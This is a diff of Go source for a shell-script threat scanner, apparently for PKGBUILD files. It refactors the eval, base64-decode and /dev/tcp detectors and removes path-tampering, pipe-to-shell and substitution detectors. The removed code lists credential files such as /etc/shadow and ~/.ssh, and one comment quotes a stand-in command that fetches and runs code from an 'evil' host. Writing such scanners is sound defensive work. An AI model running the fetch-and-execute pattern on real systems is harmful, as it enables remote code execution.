@@ -100,37 +100,47 @@ func checkCallExpr(call *syntax.CallExpr, scope string, triggers *[]ThreatTrigge
 	}
 	line := int(call.Pos().Line())
 
-	// A. Remote execution: eval
-	if cmdName == "eval" {
-		*triggers = append(*triggers, ThreatTrigger{
-			Category:    CategoryRemoteExecution,
-			Name:        "eval_execution",
-			Description: "Dynamic command execution via eval",
-			ScoreWeight: 40,
-			Line:        line,
-			Scope:       scope,
-		})
-	}
+	checkCallEval(cmdName, line, scope, triggers)
+	checkCallBase64(cmdName, args, line, scope, triggers)
+	checkCallDevSocket(cmdName, args, line, scope, triggers)
+	checkTamperingCommand(cmdName, args, line, scope, triggers, addDampener)
+}
 
-	// B. Remote execution: base64 -d
-	if cmdName == "base64" {
-		for _, arg := range args[1:] {
-			val := WordToString(arg)
-			if val == "-d" || val == "-D" || val == "--decode" {
-				*triggers = append(*triggers, ThreatTrigger{
-					Category:    CategoryRemoteExecution,
-					Name:        "base64_decode_exec",
-					Description: "Deobfuscation and execution attempt via base64 decode",
-					ScoreWeight: 40,
-					Line:        line,
-					Scope:       scope,
-				})
-				break
-			}
+func checkCallEval(cmdName string, line int, scope string, triggers *[]ThreatTrigger) {
+	if cmdName != "eval" {
+		return
+	}
+	*triggers = append(*triggers, ThreatTrigger{
+		Category:    CategoryRemoteExecution,
+		Name:        "eval_execution",
+		Description: "Dynamic command execution via eval",
+		ScoreWeight: 40,
+		Line:        line,
+		Scope:       scope,
+	})
+}
+
+func checkCallBase64(cmdName string, args []*syntax.Word, line int, scope string, triggers *[]ThreatTrigger) {
+	if cmdName != "base64" {
+		return
+	}
+	for _, arg := range args[1:] {
+		val := WordToString(arg)
+		if val == "-d" || val == "-D" || val == "--decode" {
+			*triggers = append(*triggers, ThreatTrigger{
+				Category:    CategoryRemoteExecution,
+				Name:        "base64_decode_exec",
+				Description: "Deobfuscation and execution attempt via base64 decode",
+				ScoreWeight: 40,
+				Line:        line,
+				Scope:       scope,
+			})
+			break
 		}
 	}
+}
 
-	// C. Remote execution: /dev/tcp or /dev/udp in args
+func checkCallDevSocket(cmdName string, args []*syntax.Word, line int, scope string, triggers *[]ThreatTrigger) {
 	hasDevSocket := false
 	for _, arg := range args {
 		val := WordToString(arg)
@@ -139,110 +149,27 @@ func checkCallExpr(call *syntax.CallExpr, scope string, triggers *[]ThreatTrigge
 			break
 		}
 	}
-	if hasDevSocket {
+	if !hasDevSocket {
+		return
+	}
+	*triggers = append(*triggers, ThreatTrigger{
+		Category:    CategoryRemoteExecution,
+		Name:        "dev_tcp_udp_socket",
+		Description: "Direct network socket connection via /dev/tcp or /dev/udp",
+		ScoreWeight: 45,
+		Line:        line,
+		Scope:       scope,
+	})
+	if isShell(cmdName) {
 		*triggers = append(*triggers, ThreatTrigger{
 			Category:    CategoryRemoteExecution,
-			Name:        "dev_tcp_udp_socket",
-			Description: "Direct network socket connection via /dev/tcp or /dev/udp",
-			ScoreWeight: 45,
+			Name:        "reverse_shell_redirect",
+			Description: "Interactive shell connected to network socket",
+			ScoreWeight: 40,
 			Line:        line,
 			Scope:       scope,
 		})
-		if isShell(cmdName) {
-			*triggers = append(*triggers, ThreatTrigger{
-				Category:    CategoryRemoteExecution,
-				Name:        "reverse_shell_redirect",
-				Description: "Interactive shell connected to network socket",
-				ScoreWeight: 40,
-				Line:        line,
-				Scope:       scope,
-			})
-		}
 	}
-
-	// D. System integrity tampering commands: cp, mv, install, rm, sed -i, ln -s, tee
-	checkTamperingCommand(cmdName, args, line, scope, triggers, addDampener)
-}
-
-func checkTamperingCommand(cmdName string, args []*syntax.Word, line int, scope string, triggers *[]ThreatTrigger, addDampener func(string)) {
-	switch cmdName {
-	case "cp", "mv", "install", "rm", "tee":
-		// `cp -t DIR src` / `--target-directory=DIR` name the destination via a
-		// flag, so the positional arguments are all sources. Check the flag value
-		// as the target instead of mistaking a source for the destination.
-		targetDir, rest := splitTargetDirectory(args[1:])
-		if targetDir != "" {
-			checkPathTarget(nil, targetDir, line, scope, triggers, addDampener)
-		}
-		for _, arg := range rest {
-			val := WordToString(arg)
-			if strings.HasPrefix(val, "-") {
-				continue
-			}
-			checkPathTarget(arg, val, line, scope, triggers, addDampener)
-		}
-	case "sed":
-		hasInPlace := false
-		for _, arg := range args[1:] {
-			val := WordToString(arg)
-			if strings.HasPrefix(val, "-i") || strings.HasPrefix(val, "--in-place") {
-				hasInPlace = true
-				break
-			}
-		}
-		if hasInPlace {
-			for _, arg := range args[1:] {
-				val := WordToString(arg)
-				if strings.HasPrefix(val, "-") {
-					continue
-				}
-				checkPathTarget(arg, val, line, scope, triggers, addDampener)
-			}
-		}
-	case "ln":
-		hasSymlink := false
-		for _, arg := range args[1:] {
-			val := WordToString(arg)
-			if strings.HasPrefix(val, "-s") || val == "--symbolic" {
-				hasSymlink = true
-				break
-			}
-		}
-		if hasSymlink {
-			for _, arg := range args[1:] {
-				val := WordToString(arg)
-				if strings.HasPrefix(val, "-") {
-					continue
-				}
-				checkPathTarget(arg, val, line, scope, triggers, addDampener)
-			}
-		}
-	}
-}
-
-// splitTargetDirectory extracts the value of `-t DIR`, `-tDIR`,
-// `--target-directory DIR` or `--target-directory=DIR` from a command's
-// arguments, returning the directory (empty when absent) and the arguments with
-// any consumed flag/value removed.
-func splitTargetDirectory(args []*syntax.Word) (string, []*syntax.Word) {
-	rest := make([]*syntax.Word, 0, len(args))
-	for i := 0; i < len(args); i++ {
-		val := WordToString(args[i])
-		switch {
-		case val == "-t" || val == "--target-directory":
-			if i+1 < len(args) {
-				i++
-				return WordToString(args[i]), append(rest, args[i+1:]...)
-			}
-		case strings.HasPrefix(val, "--target-directory="):
-			return strings.TrimPrefix(val, "--target-directory="), append(rest, args[i+1:]...)
-		case strings.HasPrefix(val, "-t") && len(val) > 2:
-			return val[2:], append(rest, args[i+1:]...)
-		default:
-			rest = append(rest, args[i])
-		}
-	}
-	return "", rest
 }
 
 func checkStmtRedirs(stmt *syntax.Stmt, scope string, triggers *[]ThreatTrigger, addDampener func(string)) {
@@ -287,308 +214,4 @@ func checkStmtRedirs(stmt *syntax.Stmt, scope string, triggers *[]ThreatTrigger,
 			checkPathTarget(r.Word, targetVal, line, scope, triggers, addDampener)
 		}
 	}
-}
-
-func checkPathTarget(_ *syntax.Word, rawPath string, line int, scope string, triggers *[]ThreatTrigger, addDampener func(string)) {
-	if HasStagingPrefix(rawPath) {
-		resolved, within := stagingTarget(rawPath)
-		if within {
-			addDampener("packaging_staging_dampener (path within packaging staging variables)")
-			return
-		}
-		rawPath = resolved
-	}
-
-	isSys, isCrit := matchSystemPath(rawPath)
-	if !isSys {
-		return
-	}
-
-	*triggers = append(*triggers, ThreatTrigger{
-		Category:    CategoryPathTampering,
-		Name:        "path_tampering_outside_staging",
-		Description: "Target path modifies system filesystem outside staging variables: " + rawPath,
-		ScoreWeight: 50,
-		Line:        line,
-		Scope:       scope,
-	})
-
-	if isCrit {
-		*triggers = append(*triggers, ThreatTrigger{
-			Category:    CategoryPathTampering,
-			Name:        "critical_system_file_tampering",
-			Description: "Critical authentication or system configuration targeted: " + rawPath,
-			ScoreWeight: 40,
-			Line:        line,
-			Scope:       scope,
-		})
-	}
-}
-
-func matchSystemPath(raw string) (matched bool, isCritical bool) {
-	clean := strings.Trim(raw, `'"`)
-
-	criticalExactOrPrefix := []string{
-		"/etc/sudoers",
-		"/etc/sudoers.d",
-		"/etc/shadow",
-		"/etc/passwd",
-		"/root",
-		"~/.ssh",
-	}
-
-	for _, p := range criticalExactOrPrefix {
-		if clean == p || strings.HasPrefix(clean, p+"/") {
-			return true, true
-		}
-		if p == "~/.ssh" && (strings.HasPrefix(clean, "/home/") || strings.HasPrefix(clean, "/root/")) && strings.Contains(clean, "/.ssh") {
-			return true, true
-		}
-	}
-
-	otherExactOrPrefix := []string{
-		"/boot",
-		"~/.bashrc",
-		"~/.config/autostart",
-		"/etc/ld.so.preload",
-		"/etc/ld.so.conf",
-		"/etc/crontab",
-	}
-
-	for _, p := range otherExactOrPrefix {
-		if clean == p || strings.HasPrefix(clean, p+"/") {
-			return true, false
-		}
-		if p == "~/.bashrc" && (strings.HasPrefix(clean, "/home/") || strings.HasPrefix(clean, "/root/")) && strings.HasSuffix(clean, "/.bashrc") {
-			return true, false
-		}
-		if p == "~/.config/autostart" && (strings.HasPrefix(clean, "/home/") || strings.HasPrefix(clean, "/root/")) && strings.Contains(clean, "/.config/autostart") {
-			return true, false
-		}
-	}
-
-	return false, false
-}
-
-func checkBinaryCmd(binCmd *syntax.BinaryCmd, scope string, triggers *[]ThreatTrigger) {
-	if binCmd.Op != syntax.Pipe && binCmd.Op != syntax.PipeAll {
-		return
-	}
-
-	line := int(binCmd.Pos().Line())
-	stages := collectPipelineStages(binCmd)
-	if len(stages) < 2 {
-		return
-	}
-
-	netToolFound := false
-	pipedToShell := false
-
-	for i, stage := range stages {
-		cmd, _ := getCallCommand(stage)
-		if isNetworkTool(cmd) {
-			netToolFound = true
-		}
-		if netToolFound && i > 0 && isShell(cmd) {
-			pipedToShell = true
-			break
-		}
-	}
-
-	if pipedToShell {
-		*triggers = append(*triggers, ThreatTrigger{
-			Category:    CategoryRemoteExecution,
-			Name:        "pipe_network_to_shell",
-			Description: "Pipeline piping network download tool into shell interpreter",
-			ScoreWeight: 45,
-			Line:        line,
-			Scope:       scope,
-		})
-
-		appendScopeNetworkExecution(scope, line, triggers)
-	}
-}
-
-// appendScopeNetworkExecution adds the scope-escalation trigger shared by every
-// "network download executed as code" detection (pipe-to-shell, command
-// substitution, and process substitution). Downloading and executing remote
-// content during root-scope sourcing or an install scriptlet is the highest
-// risk; inside a build function it is still a full remote-execution path.
-func appendScopeNetworkExecution(scope string, line int, triggers *[]ThreatTrigger) {
-	switch scope {
-	case ScopeRoot:
-		*triggers = append(*triggers, ThreatTrigger{
-			Category:    CategoryRemoteExecution,
-			Name:        "root_scope_network_execution",
-			Description: "Network download and execution during PKGBUILD root-scope sourcing",
-			ScoreWeight: 45,
-			Line:        line,
-			Scope:       scope,
-		})
-	case ScopeFunction:
-		*triggers = append(*triggers, ThreatTrigger{
-			Category:    CategoryRemoteExecution,
-			Name:        "function_network_execution",
-			Description: "Network download and execution inside function scope",
-			ScoreWeight: 40,
-			Line:        line,
-			Scope:       scope,
-		})
-	case ScopeInstallScriptlet:
-		*triggers = append(*triggers, ThreatTrigger{
-			Category:    CategoryRemoteExecution,
-			Name:        "install_scriptlet_network_execution",
-			Description: "Network download and execution inside install scriptlet",
-			ScoreWeight: 45,
-			Line:        line,
-			Scope:       scope,
-		})
-	}
-}
-
-func collectPipelineStages(node syntax.Node) []*syntax.CallExpr {
-	var stages []*syntax.CallExpr
-	var walkStages func(n syntax.Node)
-	walkStages = func(n syntax.Node) {
-		switch cmd := n.(type) {
-		case *syntax.BinaryCmd:
-			if cmd.Op == syntax.Pipe || cmd.Op == syntax.PipeAll {
-				walkStages(cmd.X)
-				walkStages(cmd.Y)
-				return
-			}
-		case *syntax.Stmt:
-			walkStages(cmd.Cmd)
-			return
-		case *syntax.Subshell:
-			for _, s := range cmd.Stmts {
-				walkStages(s)
-			}
-			return
-		case *syntax.CallExpr:
-			stages = append(stages, cmd)
-			return
-		}
-	}
-	walkStages(node)
-	return stages
-}
-
-func hasNetworkTool(node syntax.Node) bool {
-	foundNet := false
-	syntax.Walk(node, func(n syntax.Node) bool {
-		if n == nil {
-			return false
-		}
-		if call, ok := n.(*syntax.CallExpr); ok {
-			cmd, _ := getCallCommand(call)
-			if isNetworkTool(cmd) {
-				foundNet = true
-				return false
-			}
-		}
-		return true
-	})
-	return foundNet
-}
-
-func checkCmdSubst(subst *syntax.CmdSubst, ancestors []syntax.Node, scope string, triggers *[]ThreatTrigger) {
-	if !cmdSubstOutputExecuted(ancestors) || !hasNetworkTool(subst) {
-		return
-	}
-	line := int(subst.Pos().Line())
-	*triggers = append(*triggers, ThreatTrigger{
-		Category:    CategoryRemoteExecution,
-		Name:        "cmdsubst_network_download",
-		Description: "Command substitution executing network download",
-		ScoreWeight: 45,
-		Line:        line,
-		Scope:       scope,
-	})
-	appendScopeNetworkExecution(scope, line, triggers)
-}
-
-// checkProcSubst flags Bash process substitution that feeds a network download
-// into an interpreter, e.g. `bash <(curl -s https://evil/x.sh)`. This is a
-// distinct evasion from command substitution: the download's output is exposed
-// as a /dev/fd path argument rather than captured stdout, so the cmdsubst rules
-// never see it.
-func checkProcSubst(ps *syntax.ProcSubst, ancestors []syntax.Node, scope string, triggers *[]ThreatTrigger) {
-	if ps == nil || ps.Op != syntax.CmdIn || !procSubstOutputExecuted(ancestors) || !hasNetworkTool(ps) {
-		return
-	}
-	line := int(ps.Pos().Line())
-	*triggers = append(*triggers, ThreatTrigger{
-		Category:    CategoryRemoteExecution,
-		Name:        "procsubst_network_execution",
-		Description: "Process substitution feeding network download into interpreter",
-		ScoreWeight: 45,
-		Line:        line,
-		Scope:       scope,
-	})
-	appendScopeNetworkExecution(scope, line, triggers)
-}
-
-// procSubstOutputExecuted reports whether the process substitution's output is
-// passed to a shell interpreter, `source`, or `eval` as an argument.
-func procSubstOutputExecuted(ancestors []syntax.Node) bool {
-	for i := len(ancestors) - 1; i >= 0; i-- {
-		if call, ok := ancestors[i].(*syntax.CallExpr); ok {
-			cmd, _ := getCallCommand(call)
-			return isShell(cmd) || cmd == "source" || cmd == "." || cmd == "eval"
-		}
-	}
-	return false
-}
-
-func cmdSubstOutputExecuted(ancestors []syntax.Node) bool {
-	var word *syntax.Word
-	var call *syntax.CallExpr
-	var stmt *syntax.Stmt
-	for i := len(ancestors) - 1; i >= 0; i-- {
-		switch n := ancestors[i].(type) {
-		case *syntax.Word:
-			if word == nil {
-				word = n
-			}
-		case *syntax.CallExpr:
-			if call == nil {
-				call = n
-			}
-		case *syntax.Stmt:
-			if stmt == nil {
-				stmt = n
-			}
-		}
-	}
-	if word == nil || call == nil || len(call.Args) == 0 {
-		return false
-	}
-	cmd, _ := getCallCommand(call)
-	if cmd == "eval" || call.Args[0] == word {
-		return true
-	}
-	// Interpreter invoked with the download as an argument, e.g.
-	// `bash -c "$(curl ...)"`, `sh "$(curl ...)"`, or `source "$(curl ...)"`.
-	// The remote content is executed by the interpreter rather than merely
-	// captured, which the args[0] check above does not catch.
-	if isShell(cmd) || cmd == "source" || cmd == "." {
-		return true
-	}
-	if stmt == nil {
-		return false
-	}
-	stages := collectPipelineStages(stmt)
-	for i, stage := range stages {
-		if stage != call {
-			continue
-		}
-		for _, later := range stages[i+1:] {
-			name, _ := getCallCommand(later)
-			if isShell(name) {
-				return true
-			}
-		}
-	}
-	return false
 }
